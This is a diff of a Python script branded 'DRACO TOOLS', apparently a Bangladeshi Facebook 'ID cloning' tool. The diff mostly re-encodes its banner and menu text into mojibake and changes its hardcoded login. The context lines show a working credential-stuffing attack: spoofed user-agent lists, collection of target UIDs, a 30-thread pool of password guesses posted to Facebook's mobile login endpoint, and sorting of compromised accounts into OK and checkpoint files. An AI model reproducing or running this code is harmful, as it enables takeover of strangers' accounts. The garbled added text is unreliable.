@@ -419,7 +419,7 @@ for xd in range(10000):
   "Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/79.0.0.18.71;])",
   "Mozilla/5.0 (Linux; Android 4.1.2; GT-I8730T Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36 OPR/50.6.2426.201126)",
   "Mozilla/5.0 (Linux; Android 4.4.2; GT-193011 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Mobile UCBrowser/3.4.3.532)",
-  "Mozilla/5.0 (Linux; U; Android 4.0.4; de-de; SonyEricssonMT11i Build/Xperia Ultimate HD™ 3.0.2) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30)",
+  "Mozilla/5.0 (Linux; U; Android 4.0.4; de-de; SonyEricssonMT11i Build/Xperia Ultimate HDâ„¢ 3.0.2) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30)",
   "Mozilla/5.0 (Android; Mobile; rv:30.0) Gecko/30.0 Firefox/30.0)",
   "Mozilla/5.0 (Android; Tablet; rv:30.0) Gecko/30.0 Firefox/30.0)",
   "Mozilla/5.0 (Windows NT 6.2; rv:10.0) Gecko/20100101 Firefox/33.0)",
@@ -1065,7 +1065,7 @@ for xd in range(10000):
 
   "Mozilla/5.0 (Linux; Android 4.4.2; GT-193011 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Mobile UCBrowser/3.4.3.532",
 
-  "Mozilla/5.0 (Linux; U; Android 4.0.4; de-de; SonyEricssonMT11i Build/Xperia Ultimate HD™ 3.0.2) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
+  "Mozilla/5.0 (Linux; U; Android 4.0.4; de-de; SonyEricssonMT11i Build/Xperia Ultimate HDâ„¢ 3.0.2) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
 
   "Mozilla/5.0 (Android; Mobile; rv:30.0) Gecko/30.0 Firefox/30.0",
 
@@ -1646,30 +1646,30 @@ def animation(u):
     for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
 os.system('xdg-open https://facebook.com/groups/536478595262725/')
 logo ="""
-╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-║\033[1;91m\033[1;41m\033[1;97m              WELCOME TO DRACO TOOLS                 \033[;0m\033[1;91m\033[1;92m║
-╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
-     \x1b[38;5;50m ██████╗ ██████╗  █████╗  ██████╗ ██████╗    
-     \x1b[38;5;50m ██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔═══██╗
-      \x1b[38;5;50m██║  ██║██████╔╝███████║██║     ██║   ██║      
-      \x1b[38;5;50m██║  ██║██╔══██╗██╔══██║██║     ██║   ██║      
-      \x1b[38;5;50m██████╔╝██║  ██║██║  ██║╚██████╗╚██████╔╝    
-      \x1b[38;5;50m╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝      
-         \033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS DRACO BRAND\033[;0m\033[1;91m═══>\033[1;92m
+â•”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â•—
+â•‘\033[1;91m\033[1;41m\033[1;97m              WELCOME TO DRACO TOOLS                 \033[;0m\033[1;91m\033[1;92mâ•‘
+â•šâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â•
+     \x1b[38;5;50m â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    
+     \x1b[38;5;50m â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—
+      \x1b[38;5;50mâ–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘      
+      \x1b[38;5;50mâ–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘      
+      \x1b[38;5;50mâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•    
+      \x1b[38;5;50mâ•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•â•šâ•â•  â•šâ•â• â•šâ•â•â•â•â•â• â•šâ•â•â•â•â•â•      
+         \033[1;91m<â•â•â•\033[1;41m\033[1;97m THIS NAME IS DRACO BRAND\033[;0m\033[1;91mâ•â•â•>\033[1;92m
 \033[1;31m==================================================
-[] AUTHOR       :      𝐀𝐒𝐑𝐀𝐅 𝐀𝐇𝐌𝐄𝐃
-[] TOOLS        :     𝐅𝐈𝐋𝐄-𝐂𝐋𝐎𝐍𝐈𝐍𝐆
-[] TYPE         :       𝐅 𝐑 𝐄 𝐄
-[] FACEBOOK     :      𝐅𝐑𝐄𝐄 𝐓𝐄𝐑𝐌𝐔𝐗 𝐂𝐎𝐌𝐌𝐀𝐍𝐃
+[] AUTHOR       :      ð€ð’ð‘ð€ð… ð€ð‡ðŒð„ðƒ
+[] TOOLS        :     ð…ðˆð‹ð„-ð‚ð‹ðŽððˆðð†
+[] TYPE         :       ð… ð‘ ð„ ð„
+[] FACEBOOK     :      ð…ð‘ð„ð„ ð“ð„ð‘ðŒð”ð— ð‚ðŽðŒðŒð€ððƒ
 [] VERSION      :      1.0
-[] TELEGRAM     :      𝐓𝐄𝐀𝐌 𝐃𝐑𝐀𝐂𝐎
+[] TELEGRAM     :      ð“ð„ð€ðŒ ðƒð‘ð€ð‚ðŽ
 =================================================="\033[1;23m"""                                
-balpakna =("""\x1b[38;5;50m══════════════════════════════════════════════════""")    
+balpakna =("""\x1b[38;5;50mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•""")    
 meyermarexudi =(""" \033[0;97m=============================================""")    
 xudartimenai =(""" \033[32;1m[+] CONTACT ADMIN PLZ ENTAR""")
-fuckyoursali =(""" \033[32;1m[𝟷] 𝚈𝙾𝚄𝚁 𝚃𝙾𝙺𝙴𝙽 𝙸𝚂 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙰𝙿𝙿𝚁𝙾𝚅𝙴𝙳""")
+fuckyoursali =(""" \033[32;1m[ðŸ·] ðšˆð™¾ðš„ðš ðšƒð™¾ð™ºð™´ð™½ ð™¸ðš‚ ðš‚ðš„ð™²ð™²ð™´ðš‚ðš‚ð™µðš„ð™»ð™»ðšˆ ð™°ð™¿ð™¿ðšð™¾ðš…ð™´ð™³""")
 xudinaministar =(""" \033[38;1m[-] Importent Note """)
-hedaborakarent =(""" \033[35;1m[𝟸] 𝙵𝚄𝙲𝙺 𝙱𝚈𝙿𝙰𝚂𝙰𝚁 𝙲𝙷𝙰𝙺𝙴 𝚈𝙾𝚄𝚁 𝙳𝙰𝚃𝙰 ABAL😎 """)
+hedaborakarent =(""" \033[35;1m[ðŸ¸] ð™µðš„ð™²ð™º ð™±ðšˆð™¿ð™°ðš‚ð™°ðš ð™²ð™·ð™°ð™ºð™´ ðšˆð™¾ðš„ðš ð™³ð™°ðšƒð™° ABALðŸ˜Ž """)
 
                   #____APPROVAL SYSTEM ADD_____#
 def meyexudi():
@@ -1689,12 +1689,12 @@ def meyexudi():
     else:
       print(meyermarexudi)
      # print(" \033[32;1m[+] Your Kay : "+id)
-      print(' \x1b[38;5;208m╔══[𝟷]💥  FREE-FIRE-TIK-TOK- ID CLONING')      
-      print(' \x1b[1;93m║══[𝟸]💥  CP ID WILL BE LOGIN 80%')
-      print(' \x1b[1;97m║══[3]💥  WI-FI  AND DATA BOTH WORKING 100%')
+      print(' \x1b[38;5;208mâ•”â•â•[ðŸ·]ðŸ’¥  FREE-FIRE-TIK-TOK- ID CLONING')      
+      print(' \x1b[1;93mâ•‘â•â•[ðŸ¸]ðŸ’¥  CP ID WILL BE LOGIN 80%')
+      print(' \x1b[1;97mâ•‘â•â•[3]ðŸ’¥  WI-FI  AND DATA BOTH WORKING 100%')
       os.system('espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,   TEAM,   DRACO,    Please,   Send,   Your,   Key,"')
-      print(" \x1b[0m║══[4] YOUR KEY : "+id)
-      input(' \033[1;30m╚══[5] IF U WANT TO BUY THEN PRESS ENTER ')
+      print(" \x1b[0mâ•‘â•â•[4] YOUR KEY : "+id)
+      input(' \033[1;30mâ•šâ•â•[5] IF U WANT TO BUY THEN PRESS ENTER ')
       tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801856670349?text='+tks),approval()      
       time.sleep(1)
       meyexudi()
@@ -1706,7 +1706,7 @@ def naima():
 	print('-------------------')
 print(logo)
 os.system('espeak -a 300 " Please,   Text,   Your,   Real,   Name,   Sir,"')
-uname =input('\033[1;91m[\033[1;91m•\033[1;91m]\033[1;33m WHAT IS YOUR NAME \033[1;91m: \33[1;31m')
+uname =input('\033[1;91m[\033[1;91mâ€¢\033[1;91m]\033[1;33m WHAT IS YOUR NAME \033[1;91m: \33[1;31m')
 os.system('espeak -a 300 " Welcome,   to,  TEAM DRACO,  FREE,   TOOLS"')
 def back():
 	login()
@@ -1716,10 +1716,10 @@ def back():
 attemps = 0
 
 while attemps < 12345677901:
-    username = input('\033[1;91m[\033[1;92m√\033[1;91m]\x1b[38;5;50m ENTER USERNAME: ')
-    password = input('\033[1;95m[\033[1;95m√\033[1;95m]\x1b[38;5;50m ENTER PASSWORD: ')
+    username = input('\033[1;91m[\033[1;92mâˆš\033[1;91m]\x1b[38;5;50m ENTER USERNAME: ')
+    password = input('\033[1;95m[\033[1;95mâˆš\033[1;95m]\x1b[38;5;50m ENTER PASSWORD: ')
 
-    if username == 'F' and password == 'X':
+    if username == 'V' and password == '1':
         print(' \033[0;95mYou Have Successfully Logged in.')
         os.system('espeak -a 300 " Successfully,   Log,  In,  Sir"')
         break
@@ -1745,7 +1745,7 @@ def login():
             login_lagi334()
         except requests.exceptions.ConnectionError:
             print('\033[0;97m=================')
-            animation(' [×] NO INTERNET CONNECTION DETECTED')
+            animation(' [Ã—] NO INTERNET CONNECTION DETECTED')
             exit()
     except IOError:
         login_lagi334()
@@ -1763,7 +1763,7 @@ def login_lagi334():
             login_lagi334()
         except requests.exceptions.ConnectionError:
             print('\033[0;97m=================')
-            animation(' [×] NO INTERNET CONNECTION DETECTED')
+            animation(' [Ã—] NO INTERNET CONNECTION DETECTED')
             exit()
     except IOError:
         login_lagi334()
@@ -1789,7 +1789,7 @@ def login_lagi334():
         exit()
 
 #------------------[ MENU ]----------------#
- #===©===#
+ #===Â©===#
 class jalan:
     def __init__(self, z):
         for e in z + "\n":
@@ -1799,15 +1799,15 @@ class jalan:
 def menu():
     os.system('clear')
     print(logo)
-    print(f"\033[95;1m[\033[95;1m+\033[95;1m] \033[1;95m𝐔𝐒𝐄𝐑 𝐍𝐀𝐌𝐄\033[1;91m :\033[1;96m "+uname)
-    print("\033[97;1m[\033[92;1m•\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;96m "+date)
+    print(f"\033[95;1m[\033[95;1m+\033[95;1m] \033[1;95mð”ð’ð„ð‘ ðð€ðŒð„\033[1;91m :\033[1;96m "+uname)
+    print("\033[97;1m[\033[92;1mâ€¢\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;96m "+date)
     print('\033[0;97m===============================================')
-    print(f"""\033[91;1m[\033[92;1m1\033[91;1m] \033[0;91m𝗙𝗜𝗟𝗘 𝗖𝗟𝗢𝗡𝗜𝗡𝗚         """)
-    print("""\033[95;1m[\033[95;1m2\033[95;1m] \033[0;95m𝗖𝗢𝗡𝗧𝗔𝗖𝗧 ᏔᏆͲᎻ 𝗔𝗗𝗠𝗜𝗡""")
-    print(f"""\033[93;1m[\033[93;1m3\033[93;1m] \033[93;1m𝗖𝗛𝗘𝗖𝗞 ϴᏦ 𝗜𝗗𝘇   """)
-    print("""\033[98;1m[\033[98;1m0\033[98;1m] \033[0;98mᎬХᏆͲ""")
+    print(f"""\033[91;1m[\033[92;1m1\033[91;1m] \033[0;91mð—™ð—œð—Ÿð—˜ ð—–ð—Ÿð—¢ð—¡ð—œð—¡ð—š         """)
+    print("""\033[95;1m[\033[95;1m2\033[95;1m] \033[0;95mð—–ð—¢ð—¡ð—§ð—”ð—–ð—§ á”á†Í²áŽ» ð—”ð——ð— ð—œð—¡""")
+    print(f"""\033[93;1m[\033[93;1m3\033[93;1m] \033[93;1mð—–ð—›ð—˜ð—–ð—ž Ï´á¦ ð—œð——ð˜‡   """)
+    print("""\033[98;1m[\033[98;1m0\033[98;1m] \033[0;98máŽ¬Ð¥á†Í²""")
     print('\033[0;97m=================')
-    HEART = input('\x1b\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mCHOOSE: ')
+    HEART = input('\x1b\033[1;91m[\033[1;92mâˆš\033[1;91m] \033[1;96mCHOOSE: ')
     if HEART in ['111']:
         login()
         dump_massal()
@@ -1822,11 +1822,11 @@ def menu():
         os.system('rm -rf .token.txt')
         os.system('rm -rf .cookie.txt')
         print('\033[0;97m=================')
-        animation(' [×] DONE EXIT ')
+        animation(' [Ã—] DONE EXIT ')
         exit()
     else:
         print('\033[0;97m=================')
-        animation(' [×] SELECT CORRECTLY ')
+        animation(' [Ã—] SELECT CORRECTLY ')
         back()
  
       #-----------------[ HASIL-CRACK ]-----------------#
@@ -1838,17 +1838,17 @@ def result():
     print(' \033[95;1m[\033[95;1m2\033[95;1m] CHECK OK IDZ ')
     print(' \033[94;1m[\033[94;1m3\033[94;1m] EXIT ')
     print('\033[0;91m==================')
-    kz = input(' \033[95;1m[\033[95;1m•\033[95;1m]CHOOSE : ')
+    kz = input(' \033[95;1m[\033[95;1mâ€¢\033[95;1m]CHOOSE : ')
     if kz in ['1','01']:
         try:vin = os.listdir('CP')
         except FileNotFoundError:
             print('\033[0;91m==================')
-            animation(' \033[96;1m[\033[92;1m•\033[976;1m] FILE NOT FOUND ')
+            animation(' \033[96;1m[\033[92;1mâ€¢\033[976;1m] FILE NOT FOUND ')
             time.sleep(3)
             back()
         if len(vin)==0:
             print('\033[0;91m==================')
-            animation(' \033[95;1m[\033[95;1m•\033[95;1m] NO CP RESULTS FOUND ')
+            animation(' \033[95;1m[\033[95;1mâ€¢\033[95;1m] NO CP RESULTS FOUND ')
             time.sleep(2)
             back()
         else:
@@ -1868,37 +1868,37 @@ def result():
                     lol.update({str(cih):str(isi)})
                     print(' '+str(cih)+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
             print('\033[0;91m==================')
-            geeh = input(' \033[95;1m[\033[95;1m•\033[95;1m] CHOOSE : ')
+            geeh = input(' \033[95;1m[\033[95;1mâ€¢\033[95;1m] CHOOSE : ')
             print('\033[0;91m==================')
             try:geh = lol[geeh]
             except KeyError:
                 print('\033[0;91m==================')
-                animation(' \033[95;1m[\033[92;1m•\033[95;1m] NO OPTION FOUND ')
+                animation(' \033[95;1m[\033[92;1mâ€¢\033[95;1m] NO OPTION FOUND ')
                 exit()
             try:lin = open('CP/'+geh,'r').read().splitlines()
             except:
                 print('\033[0;91m==================')
-                animation(' \033[95;1m[\033[92;1m•\033[95;1m] FILE NOT FOUND ')
+                animation(' \033[95;1m[\033[92;1mâ€¢\033[95;1m] FILE NOT FOUND ')
                 time.sleep(2)
                 back()
             nocp=0
             for cpku in range(len(lin)):
                 cpkuni=lin[nocp].split('|')
-                print(f' \033[95;1m[\033[92;1m•\033[95;1m] CP : \033[35m {cpkuni[0]}|{cpkuni[1]}\033[0m')
+                print(f' \033[95;1m[\033[92;1mâ€¢\033[95;1m] CP : \033[35m {cpkuni[0]}|{cpkuni[1]}\033[0m')
                 nocp +=1
             print('\033[0;95m==================')
-            input('\033[97;1m[\033[92;1m•\033[97;1m] PRESS ENTER TO BACK ')
+            input('\033[97;1m[\033[92;1mâ€¢\033[97;1m] PRESS ENTER TO BACK ')
             back()
     elif kz in ['2','02']:
         try:vin = os.listdir('OK')
         except FileNotFoundError:
             print('\033[0;91m==================')
-            animation(' \033[95;1m[\033[92;1m•\033[95;1m] FILE NOT FOUND ')
+            animation(' \033[95;1m[\033[92;1mâ€¢\033[95;1m] FILE NOT FOUND ')
             time.sleep(2)
             back()
         if len(vin)==0:
             print('\033[0;91m==================')
-            animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO OK RESULTS FOUND ')
+            animation(' \033[97;1m[\033[92;1mâ€¢\033[97;1m] NO OK RESULTS FOUND ')
             time.sleep(2)
             back()
         else:
@@ -1918,32 +1918,32 @@ def result():
                     lol.update({str(cih):str(isi)})
                     print(' '+str(cih)+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x)
             print('\033[0;93m==================')
-            geeh = input(' \x1b[1;92m [•] CHOOSE : ')
+            geeh = input(' \x1b[1;92m [â€¢] CHOOSE : ')
             print('\033[0;93m==================')
             try:geh = lol[geeh]
             except KeyError:
                 print('\033[0;93m==================')
-                animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO OPTION FOUND ')
+                animation(' \033[97;1m[\033[92;1mâ€¢\033[97;1m] NO OPTION FOUND ')
                 exit()
             try:lin = open('OK/'+geh,'r').read().splitlines()
             except:
                 print('\033[0;91m==================')
-                animation(' \033[97;1m[\033[92;1m•\033[97;1m] FILE NOT FOUND ')
+                animation(' \033[97;1m[\033[92;1mâ€¢\033[97;1m] FILE NOT FOUND ')
                 time.sleep(2)
                 back()
             nocp=0
             for cpku in range(len(lin)):
                 cpkuni=lin[nocp].split('|')
-                print(f'\033[95;1m[\033[92;1m•\033[95;1m] OK : \033[35m {cpkuni[0]}|{cpkuni[1]}\033[0m')
+                print(f'\033[95;1m[\033[92;1mâ€¢\033[95;1m] OK : \033[35m {cpkuni[0]}|{cpkuni[1]}\033[0m')
                 nocp +=1
             print('\033[0;91m==================')
-            input('\033[95;1m[\033[92;1m•\033[95;1m] PRESS ENTER TO BACK ')
+            input('\033[95;1m[\033[92;1mâ€¢\033[95;1m] PRESS ENTER TO BACK ')
             back()
     elif kz in ['0','00']:
         back()
     else:
         print('\033[0;91m==================')
-        animation(' \033[95;1m[\033[92;1m•\033[95;1m] NO OPTION FOUND IN MENU')
+        animation(' \033[95;1m[\033[92;1mâ€¢\033[95;1m] NO OPTION FOUND IN MENU')
         exit()
  
 #-------------------[ CRACK-PUBLIK ]----------------#
@@ -1956,21 +1956,21 @@ def dump_massal():
         exit()
     try:
         print('\033[0;91m==================')
-        jum = int(input(' \033[95;1m[\033[92;1m•\033[95;1m] ENTER TARGET AMOUNT  : '))
+        jum = int(input(' \033[95;1m[\033[92;1mâ€¢\033[95;1m] ENTER TARGET AMOUNT  : '))
         print('\033[0;91m==================')
     except ValueError:
         print('\033[0;91m==================')
-        animation(' [×] INVALID OPTION ')
+        animation(' [Ã—] INVALID OPTION ')
         exit()
     if jum<1 or jum>100000000:
         print('\033[0;91m==================')
-        animation(' [×] TRY AGAIN ')
+        animation(' [Ã—] TRY AGAIN ')
         exit()
     ses=requests.Session()
     yz = 0
     for met in range(jum):
         yz+=1
-        kl = input(' \033[97;1m[\033[92;1m•\033[95;1m] INPUT UID '+str(yz)+' : ')
+        kl = input(' \033[97;1m[\033[92;1mâ€¢\033[95;1m] INPUT UID '+str(yz)+' : ')
         uid.append(kl)
     for userr in uid:
         try:
@@ -1985,18 +1985,18 @@ def dump_massal():
             pass
         except requests.exceptions.ConnectionError:
             print('\033[0;95m==================')
-            animation(' [×] TRY AGAIN ')
+            animation(' [Ã—] TRY AGAIN ')
             os.system('clear')
     try:
         print('\033[0;91m==================')
-        print(f' \033[92;1m[\033[92;1m•\033[92;1m] TOTAL ID : \u001b[36m'+str(len(id))+'\033[1;37m')
+        print(f' \033[92;1m[\033[92;1mâ€¢\033[92;1m] TOTAL ID : \u001b[36m'+str(len(id))+'\033[1;37m')
         setting()
     except requests.exceptions.ConnectionError:
         print(f'{u}')
         back()
     except (KeyError,IOError):
         print('\033[0;91m==================')
-        animation(" [×] DUMP ID FAILED ")
+        animation(" [Ã—] DUMP ID FAILED ")
         time.sleep(3)
         back()
  
@@ -2010,7 +2010,7 @@ def crack_file():
     try:lin = open(o).read().splitlines()
     except:
         print('\033[0;98m==================')
-        animation(' [×] FILE NOT FOUND')
+        animation(' [Ã—] FILE NOT FOUND')
         time.sleep(2)
         back()
     for xid in lin:
@@ -2021,9 +2021,9 @@ def crack_file():
  
 def setting():
     print('\033[0;91m=============================')
-    print("\033[95;1m[\033[95;1m1\033[95;1m] \033[0;95mCLONING FOR ONLY 𝐎𝐋𝐃 IDz")
-    print("\033[98;1m[\033[98;1m2\033[98;1m] \033[0;98mCLONING FOR ONLY 𝐍𝐄𝐖 IDz")
-    print("\033[91;1m[\033[91;1m3\033[91;1m] \033[0;91mCLONING FOR 𝐌𝐈𝐗 IDz")
+    print("\033[95;1m[\033[95;1m1\033[95;1m] \033[0;95mCLONING FOR ONLY ðŽð‹ðƒ IDz")
+    print("\033[98;1m[\033[98;1m2\033[98;1m] \033[0;98mCLONING FOR ONLY ðð„ð– IDz")
+    print("\033[91;1m[\033[91;1m3\033[91;1m] \033[0;91mCLONING FOR ðŒðˆð— IDz")
     print('\033[0;91m=============================')
     hu = input('\033[95;1m[\033[92;1m+\033[95;1m]CHOOSE :\033[95;1m ')
     if hu in ['1','01']:
@@ -2048,10 +2048,10 @@ def setting():
             id2.insert(xx,bacot)
     print('\033[0;91m==================')
     print('\033[0;91m==================')
-    print("\033[98;1m[\033[98;1m1\033[98;1m] METHOD 1 [\035𝐍𝐞𝐰 𝐕𝐞𝐫𝐬𝐢𝐨𝐧\033[1;37m]")
-    print("\033[93;1m[\033[93;1m2\033[93;1m] METHOD 2 [\034𝐎𝐥𝐝 𝐕𝐞𝐫𝐬𝐢𝐨𝐧\033[1;37m]")
+    print("\033[98;1m[\033[98;1m1\033[98;1m] METHOD 1 [\035ððžð° ð•ðžð«ð¬ð¢ð¨ð§\033[1;37m]")
+    print("\033[93;1m[\033[93;1m2\033[93;1m] METHOD 2 [\034ðŽð¥ð ð•ðžð«ð¬ð¢ð¨ð§\033[1;37m]")
     print('\033[0;91m==================')
-    hc = input('\033[95;1m[\033[92;1m•\033[95;1m] CHOOSE : ')
+    hc = input('\033[95;1m[\033[92;1mâ€¢\033[95;1m] CHOOSE : ')
     #os.system("xdg-open https://www.facebook.com/profile.php?id=100073213626571")
     if hc in ['1','01']:
         method.append('mobile')
@@ -2067,11 +2067,11 @@ def setting():
 def passwrd():
     os.system('clear')
     print(logo)
-    print(f"\033[1;91m[\033[1;91m√\033[1;91m] \033[1;91m𝐔𝐒𝐄𝐑𝐒 𝐍𝐀𝐌𝐄\033[1;91m :\033[1;96m "+𝚞𝚗𝚊𝚖𝚎)
-    print('\033[1;91m[\033[1;92m√\033[1;91m] \033[1;93m𝚈𝙾𝚄𝚁 TOTAL 𝙸𝙳𝚣 \033[0;97m:\x1b[38;5;50m ',str(len(id)))
-    print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;95m𝗦𝗧𝗔𝗥𝗧𝗘𝗗 𝗬𝗢𝗨𝗥 𝗖𝗟𝗢𝗡𝗜𝗡𝗚 𝗧𝗜𝗠𝗘 \033[0;97m :> \x1b[38;5;50m"+time.strftime("%H:%M")+" "+ tag)
-    print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;91m𝐂𝐋𝐎𝐍𝐈𝐍𝐆 𝐒𝐏𝐄𝐄𝐃 𝐒𝐔𝐏𝐄𝐑 𝐅𝐀𝐒𝐓 ⏩")
-    print(f'\033[1;91m[\033[1;92m√\033[1;91m] \033[1;98m𝐔𝐒𝐄=[𝐅𝐋𝐈𝐆𝐇𝐓 𝐌𝐎𝐃𝐄 𝙵𝙾𝚁 𝚂𝙿𝙴𝙴𝙳 𝚄𝙿✅] ')
+    print(f"\033[1;91m[\033[1;91mâˆš\033[1;91m] \033[1;91mð”ð’ð„ð‘ð’ ðð€ðŒð„\033[1;91m :\033[1;96m "+ðšžðš—ðšŠðš–ðšŽ)
+    print('\033[1;91m[\033[1;92mâˆš\033[1;91m] \033[1;93mðšˆð™¾ðš„ðš TOTAL ð™¸ð™³ðš£ \033[0;97m:\x1b[38;5;50m ',str(len(id)))
+    print("\033[1;91m[\033[1;92mâˆš\033[1;91m] \033[1;95mð—¦ð—§ð—”ð—¥ð—§ð—˜ð—— ð—¬ð—¢ð—¨ð—¥ ð—–ð—Ÿð—¢ð—¡ð—œð—¡ð—š ð—§ð—œð— ð—˜ \033[0;97m :> \x1b[38;5;50m"+time.strftime("%H:%M")+" "+ tag)
+    print("\033[1;91m[\033[1;92mâˆš\033[1;91m] \033[1;91mð‚ð‹ðŽððˆðð† ð’ðð„ð„ðƒ ð’ð”ðð„ð‘ ð…ð€ð’ð“ â©")
+    print(f'\033[1;91m[\033[1;92mâˆš\033[1;91m] \033[1;98mð”ð’ð„=[ð…ð‹ðˆð†ð‡ð“ ðŒðŽðƒð„ ð™µð™¾ðš ðš‚ð™¿ð™´ð™´ð™³ ðš„ð™¿âœ…] ')
     print('\x1b[38;5;50m===============================================')
     with tred(max_workers=30) as pool:
         for yuzong in id2:
@@ -2169,7 +2169,7 @@ def passwrd():
                 pool.submit(crackfree,idf,pwv)
     print('\n\033[1;37m===================================')
     print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
-    print('\033[97;1m[\033[92;1m•\033[95;1m] OK :\033[0;92m %s '%(ok))
+    print('\033[97;1m[\033[92;1mâ€¢\033[95;1m] OK :\033[0;92m %s '%(ok))
     print('\033[97;1m[\033[92;1m+\033[96;1m] CP :\033[0;93m %s '%(cp))
     print('\n\033[1;37m===================================')
     woi = input('\033[97;1m[\033[92;1m+\033[95;1m] \033[1;37m ENTER TO BACK')
@@ -2180,7 +2180,7 @@ def passwrd():
 def crack(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r\033[100;95m{bo}[ DRACO 🔍•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
+    sys.stdout.write(f"\r\033[100;95m{bo}[ DRACO ðŸ”â€¢M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}â€¢{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -2197,19 +2197,19 @@ def crack(idf,pwv):
             heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
